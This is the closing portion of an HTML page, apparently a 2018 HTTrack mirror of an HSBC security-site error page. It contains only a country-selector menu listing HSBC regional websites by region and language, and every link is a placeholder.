        </div>
    </div>
    <div  class="loadinContent" data-dojo-type="hsbcwidget/countrySelector" dir="ltr" id="countrySelectorContent">
        <div class="tabsNode">
            <ul class="regionTabs">
                <li class="selected">
                    <a class="europe" data-region="europe" href="#" title="Europe: Click to view HSBC websites in this region" aria-expanded="true">Europe</a></li>
                <li>
                    <a class="asiaPacific" data-region="asiaPacific" href="#" title="Asia-Pacific: Click to view HSBC websites in this region">Asia-Pacific</a></li>
                <li>
                    <a class="middleEast" data-region="middleEast" href="#" title="Middle East &amp; Africa: Click to view HSBC websites in this region" aria-expanded="true" >Middle East &amp; Africa</a></li>
                <li>
                    <a class="americas" data-region="americas" href="#" title="Americas: Click to view HSBC websites in this region" aria-expanded="true">Americas</a></li>
            </ul>
        </div>
        <div class="regions">
            <div aria-hidden="false" class="region activeRegion" id="europe" role="tabpanel">
                <h2 style=" display: none;">
                    Europe</h2>
                <div class="navList">
                    <ul class="nav" >
                        <li  class="multiTop" >
                            <a href="#" title="Armenia"  class="am" lang="en-GB">Armenia</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Հայաստան"  lang="hy-AM">Հայաստան</a></li>
                        <li >
                            <a href="#" title="Channel Islands and Isle of Man"  class="im" lang="en-GB">Channel Islands and Isle of Man</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Czech Republic"   class="cz" lang="cs-CZ">Czech Republic</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Česká republika"  lang="en-GB">Česká republika</a></li>
                        <li  class="multiTop">
                            <a href="#" title="France (English)"  class="fr" lang="en-GB">France <span>(English)</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="France (Français)"  lang="fr-FR">France <span>(Français)</span></a></li>
                        <li >
                            <a href="#" title="Germany"  class="de" lang="en-GB">Germany</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Greece"  class="gr" lang="en-GB" >Greece</a></li>
                        <li  class="last multiBottom">
                            <a href="#" title="&Epsilon;&lambda;&lambda;ά&delta;&alpha;"  lang="el-GR">Ελλάδα</a></li>
                    </ul>
                    <ul class="nav" >
                        <li >
                            <a href="#" title="HSBC Expat"  class="je" lang="en-GB">HSBC Expat</a></li>
                        <li >
                            <a href="#" title="Hungary"  class="hu" lang="hu-HU" >Hungary</a></li>
                        <li >
                            <a href="#" title="Ireland"  class="ie" lang="en-IE">Ireland</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Kazakhstan"  class="kz" lang="en-GB" >Kazakhstan</a></li>
                        <li  class="multiMiddle">
                            <a href="#" title="Қазақстан"  lang="kk-KZ">Қазақстан</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Казахстан"  lang="ru-RU">Казахстан</a></li>
                        <li >
                            <a href="#" title="Malta"  class="mt" lang="en-GB">Malta</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Poland"  class="pl" lang="en-GB">Poland</a></li>
                        <li  class="last multiBottom">
                            <a href="#" title="Polska"  lang="pl-PL">Polska</a></li>
                    </ul>
                    <ul class="nav" >
                        <li  class="multiTop">
                            <a href="#" title="Russia"  class="ru" lang="en-GB">Russia</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Россия"  lang="ru-RU">Россия</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Slovakia"  class="sk" lang="en-GB">Slovakia</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Slovensko"  lang="sk-SK">Slovensko</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Spain"  class="es" lang="es-ES">Spain</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="España"  lang="en-GB">España</a></li>
                        <li >
                            <a href="#" title="Switzerland"  class="ch" lang="en-GB">Switzerland</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Turkey"  class="tr" lang="en-GB">Turkey</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Türkiye"  lang="tr-TR">Türkiye</a></li>
                        <li  class="last">
                            <a href="#" title="United Kingdom"  class="uk" lang="en-GB">United Kingdom</a></li>
                    </ul>
                </div>
            </div>
            <div aria-hidden="true" class="region" id="asiaPacific" style=" display: none;" role="tabpanel">
                <h2 style=" display: none;">
                    Asia-Pacific</h2>
                <div class="navList">
                    <ul class="nav" >
                        <li >
                            <a href="#" title="Australia" class="au" lang="en-AU" >Australia</a></li>
                        <li >
                            <a href="#" title="Bangladesh"  class="bd" lang="en-GB" >Bangladesh</a></li>
                        <li >
                            <a href="#" title="Brunei Darussalam"  class="bn" lang="en-GB" >Brunei Darussalam</a></li>
                        <li  class="multiTop">
                            <a href="#" title="China"  class="cn" lang="en-GB" >China</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="中国"  lang="zh-CN" >中国</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Hong Kong"  class="hk" lang="en-GB" >Hong Kong</a></li>
                        <li  class="multiMiddle">
                            <a href="#" title="香港（繁體中文）"  lang="zh-HK" >香港<span>（繁體中文）</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="香港（简体中文）"  lang="zh-CN">香港<span>（简体中文）</span></a></li>
                        <li  class="multiTop">
                            <a href="#" title="Indonesia (English)"  class="id" lang="en-GB" >Indonesia <span>(English)</span></a></li>
                        <li  class="last multiBottom">
                            <a href="#" title="Indonesia (Bahasa Indonesia)"  lang="id-ID" >Indonesia <span>(Bahasa Indonesia)</span></a></li>
                    </ul>
                    <ul class="nav" >
                        <li >
                            <a href="#" title="India"  class="in" lang="en-GB">India</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Japan"  class="jp" lang="en-GB">Japan</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="日本"  lang="ja-JP">日本</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Korea"  class="kr" lang="en-GB">Korea</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="한국"  lang="ko-KR">한국</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Macau"  class="mo" lang="en-GB">Macau</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="澳門"  lang="zh-MO">澳門</a></li>
                        <li >
                            <a href="#" title="Malaysia"  class="my" lang="en-GB">Malaysia</a></li>
                        <li >
                            <a href="#" title="Maldives"  class="mv" lang="en-GB">Maldives</a></li>
                        <li  class="last">
                            <a href="#" title="New Zealand"  class="nz" lang="en-NZ">New Zealand</a></li>
                    </ul>
                    <ul class="nav" >
                        <li >
                            <a href="#" title="Pakistan"  class="pk" lang="en-GB">Pakistan</a></li>
                        <li >
                            <a href="#" title="Philippines"  class="ph" lang="en-PH">Philippines</a></li>
                        <li >
                            <a href="#" title="Singapore"   class="sg" lang="en-GB">Singapore</a></li>
                        <li >
                            <a href="#" title="Sri Lanka"  class="lk" lang="en-GB">Sri Lanka</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Taiwan"  class="tw" lang="en-GB">Taiwan</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="台灣"  lang="zh-TW">台灣</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Thailand"  class="th" lang="en-GB">Thailand</a></li>
                        <li  class="multiBottom">
                            <a href="#" title="ประเทศไทย"  lang="th-TH">ประเทศไทย</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Vietnam"  class="vn" lang="en-GB">Vietnam</a></li>
                        <li  class="last multiBottom">
                            <a href="#" title="Việt Nam"  lang="vi-VN">Việt Nam</a></li>
                    </ul>
                </div>
            </div>
            <div aria-hidden="true" class="region" id="middleEast" style=" display: none;" role="tabpanel">
                <h2 style=" display: none;">
                    Middle East &amp; Africa</h2>
                <div class="navList">
                    <ul class="nav" >
                        <li >
                            <a href="#" title="Algeria"  class="dz" lang="fr-FR">Algeria</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Bahrain (Conventional Banking)"  class="bh" lang="en-GB">Bahrain <span>(Conventional)</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Bahrain (Islamic Amanah Banking)"  lang="en-GB">Bahrain <span>(Islamic Amanah)</span></a></li>
                        <li >
                            <a href="#" title="Egypt"   class="eg" lang="en-GB">Egypt</a></li>
                        <li >
                            <a href="#" title="Jordan"  class="jo" lang="en-GB">Jordan</a></li>
                        <li>
                            <a href="#" title="Kuwait"  class="kw" lang="en-GB">Kuwait</a></li>
                        <li >
                            <a href="#" title="Lebanon"  class="lb" lang="en-GB">Lebanon</a></li>
                        <li  class="last">
                            <a href="#" title="Mauritius"  class="mu" lang="en-GB">Mauritius</a></li>
                    </ul>
                    <ul class="nav">
                        <li >
                            <a href="#" title="Oman"  class="om" lang="en-GB">Oman</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Qatar (Conventional Banking)"  class="qa" lang="en-GB">Qatar <span>(Conventional)</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Qatar (Islamic Amanah Banking)"  lang="en-GB">Qatar <span>(Islamic Amanah)</span></a></li>
                        <li >
                            <a href="#" title="Saudi Arabia"  class="sa" lang="en-GB">Saudi Arabia</a></li>
                        <li >
                            <a href="#" title="السعودية"  lang="ar-SA">السعودية</a></li>
                        <li >
                            <a href="#" title="South Africa"  class="za" lang="en-ZA">South Africa</a></li>
                        <li  class="multiTop">
                            <a href="#" title="United Arab Emirates (Conventional Banking)"  class="ae" lang="en-GB">United Arab Emirates <span>(Conventional)</span></a></li>
                        <li  class="last multiBottom">
                            <a href="#" title="United Arab Emirates (Islamic Amanah Banking)"  lang="en-GB">United Arab Emirates <span>(Islamic Amanah)</span></a></li>
                    </ul>
                </div>
            </div>
            <div aria-hidden="true" class="region" id="americas" style=" display: none;" role="tabpanel">
                <h2 style=" display: none;">
                    Americas</h2>
                <div class="navList">
                    <ul  class="nav">
                        <li >
                            <a href="#" title="Argentina"  class="ar" lang="es-AR">Argentina</a></li>
                        <li >
                            <a href="#" title="Bermuda"  class="bm" lang="en-US">Bermuda</a></li>
                        <li  class="multiTop">
                            <a href="#" title="Brazil (English)"  class="br" lang="en-US">Brazil <span>(English)</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Brasil (Português)"  lang="pt-BR">Brasil <span>(Português)</span></a></li>
                        <li class="multiTop">
                            <a href="#" title="Canada (English)"  class="ca" lang="en-CA">Canada <span>(English)</span></a></li>
                        <li  class="multiMiddle">
                            <a href="#" title="Canada (Français)"  lang="fr-CA">Canada <span>(Français)</span></a></li>
                        <li  class="multiMiddle">
                            <a href="#" title="加拿大（繁體中文）"  lang="zh-HK">加拿大<span>（繁體中文）</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="加拿大（简体中文）"  lang="zh-CN">加拿大<span>（简体中文）</span></a></li>
                        <li  class="last">
                            <a href="#" title="Cayman Islands"  class="ky" lang="en-US">Cayman Islands</a></li>
                    </ul>
                    <ul class="nav" >
                        <li  class="multiTop">
                            <a href="#" title="Chile (English)"  class="cl" lang="en-US">Chile <span>(English)</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Chile (Español)"  lang="es-CL">Chile <span>(Español)</span></a></li>
                        <li  class="multiTop">
                            <a href="#" title="Colombia (English)"  class="co" lang="en-US">Colombia <span>(English)</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Colombia (Español)"  lang="es-CO">Colombia <span>(Español)</span></a></li>
                        <li >
                            <a href="#" title="Costa Rica"  class="cr" lang="es-CR">Costa Rica</a></li>
                        <li >
                            <a href="#" title="El Salvador"  class="sv" lang="es-SV">El Salvador</a></li>
                        <li >
                            <a href="#" title="Honduras"  class="hn" lang="es-HN">Honduras</a></li>
                        <li class="multiTop">
                            <a href="#" title="Mexico (English)"  class="mx" lang="en-US">Mexico <span>(English)</span></a></li>
                        <li  class="last multiBottom">
                            <a href="#" title="México (Español)"  lang="es-MX">México <span>(Español)</span></a></li>
                    </ul>
                    <ul class="nav">
                        <li  class="multiTop">
                            <a href="#" title="Panama (English)"  class="pa" lang="en-US">Panama <span>(English)</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Panamá (Español)"  lang="es-PA">Panamá <span>(Español)</span></a></li>
                        <li  class="multiTop">
                            <a href="#" title="Paraguay (English)"  class="py" lang="en-US">Paraguay <span>(English)</span></a></li>
                        <li  class="multiBottom">
                            <a href="#" title="Paraguay (Español)"  lang="es-PY">Paraguay <span>(Español)</span></a></li>
                        <li >
                            <a href="#" title="Perú"  class="pe" lang="es-PE">Perú</a></li>
                        <li >
                            <a href="#" title="United States"  class="us" lang="en-US">United States</a></li>
                        <li  class="last">
                            <a href="#" title="Uruguay"  class="uy" lang="es-UY">Uruguay</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <!-- Footer Section Ends -->
</div>
</body>
<!-- Mirrored from www.security.hsbc.co.uk/gsa/IDV_GLOBAL_SESSION_INVALID_ERROR/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 09 Sep 2018 19:40:15 GMT -->
</html>
